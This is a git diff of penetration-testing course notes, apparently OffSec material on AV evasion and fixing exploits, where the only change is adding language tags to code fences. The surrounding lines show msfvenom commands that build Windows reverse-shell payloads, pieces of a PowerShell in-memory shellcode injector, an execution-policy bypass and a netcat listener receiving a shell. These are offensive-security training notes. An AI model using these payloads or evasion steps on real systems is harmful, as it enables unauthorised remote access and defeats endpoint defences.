@@ -161,7 +161,7 @@ Before generating a payload, make sure Kali and MSF are up to date.  MSF is upda
  - `LPORT` rev shell local port.
  - `-f` specifying `EXE` file format.
 	- `>` output a file names `binary.exe`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/fixing-exploits]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f exe > binary.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -345,7 +345,7 @@ $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
  - Uses the `CreateThread` API.
 - We have to add a payload and will use the same one as the PE for consistency.
  - Generate with msfvenom.
-```
+```bash
 kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
 ...
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -410,7 +410,7 @@ $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 	- `Get-ExecutionPolicy -Scope CurrentUser`
 - Then set it to *Unrestricted*;
 	- `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
-```
+```powershell
 PS C:\Users\offsec\Desktop> .\meminj.ps1
 .\meminj.ps1 : File C:\Users\offsec\Desktop\meminj.ps1 cannot be loaded because running scripts is disabled on this
 system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
@@ -433,7 +433,7 @@ Unrestricted
 ```
 - Now we start a local netcat listener and run our scipts.
 - The script executes and we receive a reverse shell.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/av-evasion]
 └─$ nc -nvlp 443            
 listening on [any] 443 ...
